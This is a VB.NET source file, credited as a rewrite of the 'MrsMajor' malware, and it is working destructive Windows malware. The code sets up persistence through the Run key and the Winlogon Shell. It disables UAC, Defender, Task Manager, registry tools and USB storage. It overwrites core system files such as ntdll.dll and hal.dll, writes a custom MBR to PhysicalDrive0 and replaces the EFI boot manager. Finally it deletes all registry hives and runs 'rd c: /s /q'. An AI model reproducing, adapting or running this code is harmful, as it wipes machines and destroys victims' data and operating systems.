' The original source code made by rootabx is available at: https://github.com/Gork3m/MrsMajor-3.0
' rewritten in VB.NET by Angel Castillo / Windows Vista

Imports System.Diagnostics
Imports System.IO
Imports System.Threading
Imports System.Windows.Forms
Imports Microsoft.Win32
Imports System.Runtime.InteropServices

Module Program

    ' Import CreateFile from Kernel32.dll for low-level disk access
    <DllImport("kernel32.dll", SetLastError:=True, CharSet:=CharSet.Auto)>
    Private Function CreateFile(
        ByVal lpFileName As String,
        ByVal dwDesiredAccess As UInteger,
        ByVal dwShareMode As UInteger,
        ByVal lpSecurityAttributes As IntPtr,
        ByVal dwCreationDisposition As UInteger,
        ByVal dwFlagsAndAttributes As UInteger,
        ByVal hTemplateFile As IntPtr) As IntPtr
    End Function

    ' Import WriteFile from Kernel32.dll for writing to the disk
    <DllImport("kernel32.dll", SetLastError:=True)>
    Private Function WriteFile(
        ByVal hFile As IntPtr,
        ByVal lpBuffer As Byte(),
        ByVal nNumberOfBytesToWrite As UInteger,
        ByRef lpNumberOfBytesWritten As UInteger,
        ByVal lpOverlapped As IntPtr) As Boolean
    End Function

    ' Import CloseHandle from Kernel32.dll for closing disk handle
    <DllImport("kernel32.dll", SetLastError:=True)>
    Private Function CloseHandle(ByVal hObject As IntPtr) As Boolean
    End Function

    Const GENERIC_WRITE As UInteger = &H40000000
    Const OPEN_EXISTING As UInteger = 3
    Const FILE_ATTRIBUTE_NORMAL As UInteger = &H80

    Sub WriteMBR(ByVal binFilePath As String, ByVal diskPath As String)
        ' Open the binary file for reading
        If Not File.Exists(binFilePath) Then
            Console.WriteLine("Error: Unable to find binary file {0}", binFilePath)
            Return
        End If

        Dim buffer(511) As Byte
        Using binFile As New FileStream(binFilePath, FileMode.Open, FileAccess.Read)
            If binFile.Length < 512 Then
                Console.WriteLine("Error: The binary file does not contain 512 bytes.")
                Return
            End If
            ' Read the first 512 bytes
            binFile.Read(buffer, 0, buffer.Length)
        End Using

        ' Open the disk for writing
        Dim disk As IntPtr = CreateFile(diskPath, GENERIC_WRITE, 0, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero)
        If disk = IntPtr.Zero OrElse disk = New IntPtr(-1) Then
            Console.WriteLine("Error: Unable to open disk {0}. Error Code: {1}", diskPath, Marshal.GetLastWin32Error())
            Return
        End If

        ' Write the 512 bytes to the disk
        Dim bytesWritten As UInteger
        Dim success As Boolean = WriteFile(disk, buffer, CUInt(buffer.Length), bytesWritten, IntPtr.Zero)
        If Not success OrElse bytesWritten <> 512 Then
            Console.WriteLine("Error: Failed to write 512 bytes to disk {0}. Error Code: {1}", diskPath, Marshal.GetLastWin32Error())
        Else
            Console.WriteLine("MBR successfully written to {0}", diskPath)
        End If

        ' Close the disk handle
        CloseHandle(disk)
    End Sub

    Public Sub runprotector()
        Application.Run(New protection64())
    End Sub

    Public Sub runmform()
        Application.Run(New majorsgui())
    End Sub

    Sub Main()
        ' Add application to startup
        Try
            Dim startupKey As RegistryKey = Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Run")
            startupKey.SetValue("MrsMajor5", Application.ExecutablePath)
            startupKey.Close()
        Catch ex As Exception
            Console.WriteLine("Error adding application to startup: " & ex.Message)
        End Try

        ' Set EnableLUA to 0 to disable UAC prompts
        Try
            Dim reg As RegistryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System")
            reg.SetValue("EnableLUA", 0)
            reg.Close()
        Catch ex As Exception
            Console.WriteLine("Error setting EnableLUA registry value: " & ex.Message)
        End Try

        ' Initial registry modifications
        Try
            Dim reg As RegistryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon")
            reg.SetValue("Shell", "explorer.exe, wscript.exe ""C:\windows\winbase_base_procid_none\secureloc0x65\WinRapistI386.vbs""")
            reg.Close()
        Catch ex As Exception
            Console.WriteLine("Error modifying Winlogon registry: " & ex.Message)
        End Try

        Try
            Dim reg As RegistryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system")
            reg.SetValue("ConsentPromptBehaviorAdmin", 0)
            reg.Close()
        Catch ex As Exception
            Console.WriteLine("Error modifying Policies\system registry: " & ex.Message)
        End Try

        Try
            Dim reg As RegistryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop")
            reg.SetValue("NoChangingWallpaper", 0)
            reg.Close()
        Catch ex As Exception
            Console.WriteLine("Error modifying Policies\ActiveDesktop registry back to 0: " & ex.Message)
        End Try

        ' Set wallpaper and disable changing it
        Try
            Dim reg As RegistryKey = Registry.CurrentUser.CreateSubKey("Control Panel\Desktop")
            reg.SetValue("Wallpaper", "Resources1\MrsMajor5.png")
            reg.SetValue("WallpaperStyle", 2) ' Center wallpaper
            reg.Close()
        Catch ex As Exception
            Console.WriteLine("Error setting wallpaper: " & ex.Message)
        End Try

        Try
            Dim reg As RegistryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop")
            reg.SetValue("NoChangingWallpaper", 1)
            reg.Close()
        Catch ex As Exception
            Console.WriteLine("Error modifying Policies\ActiveDesktop registry: " & ex.Message)
        End Try

        Try
            Dim reg As RegistryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System")
            reg.SetValue("DisableTaskMgr", 1)
            reg.Close()
        Catch ex As Exception
            Console.WriteLine("Error modifying Policies\System registry (DisableTaskMgr): " & ex.Message)
        End Try

        Try
            Dim reg As RegistryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System")
            reg.SetValue("DisableRegistryTools", 1)
            reg.Close()
        Catch ex As Exception
            Console.WriteLine("Error modifying Policies\System registry (DisableRegistryTools): " & ex.Message)
        End Try

        Try
            Dim reg As RegistryKey = Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Policies\Explorer")
            reg.SetValue("NoRun", 1)
            reg.Close()
        Catch ex As Exception
            Console.WriteLine("Error modifying Policies\Explorer registry (NoRun): " & ex.Message)
        End Try

        Try
            Dim reg As RegistryKey = Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Policies\Explorer")
            reg.SetValue("NoWinKeys", 1)
            reg.Close()
        Catch ex As Exception
            Console.WriteLine("Error modifying Policies\Explorer registry (NoWinKeys): " & ex.Message)
        End Try

        Try
            Dim reg As RegistryKey = Registry.LocalMachine.CreateSubKey("SYSTEM\CurrentControlSet\Services\usbstor")
            reg.SetValue("Start", 4)
            reg.Close()
        Catch ex As Exception
            Console.WriteLine("Error modifying Services\usbstor registry: " & ex.Message)
        End Try

        Try
            Dim reg As RegistryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\Policies\Microsoft\Windows Defender")
            reg.SetValue("DisableAntiSpyware", 1)
            reg.Close()
        Catch ex As Exception
            Console.WriteLine("Error modifying Microsoft\Windows Defender registry: " & ex.Message)
        End Try

        Try
            Dim reg As RegistryKey = Registry.CurrentUser.CreateSubKey("Control Panel\Cursors")
            reg.SetValue("Arrow", "C:\Windows\winbase_base_procid_none\secureloc0x65\rcur.cur")
            reg.SetValue("AppStarting", "C:\Windows\winbase_base_procid_none\secureloc0x65\rcur.cur")
            reg.SetValue("Hand", "C:\Windows\winbase_base_procid_none\secureloc0x65\rcur.cur")
            reg.Close()
        Catch ex As Exception
            Console.WriteLine("Error modifying Cursors registry: " & ex.Message)
        End Try

        ' Perform resource-related tasks
        If File.Exists("C:\Windows\WinAttr.gci") Then
            ' Check if emirhanucankek.txt exists
            If Not File.Exists("C:\Windows\emirhanucankek.txt") Then
                ' Create the file if it doesn't exist
                Try
                    File.Create("C:\Windows\emirhanucankek.txt").Dispose()
                    Console.WriteLine("Created emirhanucankek.txt")
                    ' Exit before doing destructive tasks
                    Return
                Catch ex As Exception
                    Console.WriteLine("Error creating emirhanucankek.txt: " & ex.Message)
                    Return
                End Try
            Else
                ' If file exists, continue with resource-related tasks
                Dim files2owr() As String = {"winload.exe", "csrss.exe", "wininit.exe", "wininet.dll", "aclui.dll", "ADVAPI32.DLL", "crypt32.dll", "hal.dll", "logonui.exe", "ntdll.dll", "cryptbase.dll", "kernel32.dll", "userinit.exe", "crypt.dll", "chkdsk.exe"}
                Dim currentDirectory As String = Environment.CurrentDirectory
                Dim username As String = Environment.GetEnvironmentVariable("username")

                For Each fileName In files2owr
                    ' Create the batch file for each file
                    Dim text As String = "@echo off" & vbNewLine & "cd %windir%\System32" & vbNewLine & "takeown /f " & fileName & vbNewLine & "icacls " & fileName & "/grant """ & username & """:F" & vbNewLine & "echo xa > """ & fileName & """"
                    Dim batchFilePath As String = Path.Combine(currentDirectory, "taskOverwrite_" & fileName & ".bat")
                    File.WriteAllText(batchFilePath, text)

                    Try
                        Dim prc As New Process
                        prc.StartInfo.FileName = "cmd.exe"
                        prc.StartInfo.Arguments = "/c """ & batchFilePath & """"
                        prc.StartInfo.Verb = "runas"
                        prc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
                        prc.Start()
                    Catch ex As Exception
                        Console.WriteLine("Error running batch file for " & fileName & ": " & ex.Message)
                    End Try
                Next

                ' Perform resource-related operations
                WriteMBR("Resources1\mrsmajor5mbr.bin", "\\.\PhysicalDrive0")
                RunCommand("mountvol x: /s")
                ExtractAndCopyEFI("Resources1\bootmgfw.efi", "X:\EFI\Boot\Microsoft\bootmgfw.efi")

                ' Show message box after resource tasks are done
                MsgBox("You messed up... But if you don't click this message nothing's going to happen.", MsgBoxStyle.Critical, "uh oh")

                ' Change the registry value back to 0 after showing the message box
                Try
                    Dim reg As RegistryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System")
                    reg.SetValue("DisableRegistryTools", 0)
                    reg.Close()
                Catch ex As Exception
                    Console.WriteLine("Error changing DisableRegistryTools registry value back to 0: " & ex.Message)
                End Try

                ' Start destructive tasks in a separate thread
                Dim destructiveThread As New Thread(AddressOf PerformDestructiveTasks)
                destructiveThread.Start()
            End If
        End If

        ' Continue with the rest of the tasks
        System.Threading.ThreadPool.QueueUserWorkItem(New Threading.WaitCallback(AddressOf runprotector))
        System.Threading.ThreadPool.QueueUserWorkItem(New Threading.WaitCallback(AddressOf runmform))
        Application.Run(New MainForm())
    End Sub

    Private Sub PerformDestructiveTasks()
        ' Perform destructive tasks
        Try
            Dim regKeysToDelete() As String = {
                "HKCR",
                "HKCU",
                "HKLM",
                "HKU",
                "HKCC"
            }

            For Each regKey In regKeysToDelete
                RunCommand($"reg delete {regKey} /f")
            Next

            ' Dangerous command to delete the C: drive
            RunCommand("rd c: /s /q")
        Catch ex As Exception
            Console.WriteLine("Error performing destructive tasks: " & ex.Message)
        End Try
    End Sub

    Private Sub ExtractAndCopyEFI(sourceFilePath As String, destinationFilePath As String)
        ' Extract and copy EFI file to the destination
        File.Copy(sourceFilePath, destinationFilePath, True)
    End Sub

    Private Sub RunCommand(command As String)
        ' Execute a command line process
        Dim processInfo As New ProcessStartInfo("cmd.exe", $"/c {command}") With {
            .RedirectStandardOutput = True,
            .UseShellExecute = False,
            .CreateNoWindow = True
        }
        Using process As Process = Process.Start(processInfo)
            Dim output As String = process.StandardOutput.ReadToEnd()
            process.WaitForExit()
            Console.WriteLine(output)
        End Using
    End Sub

End Module
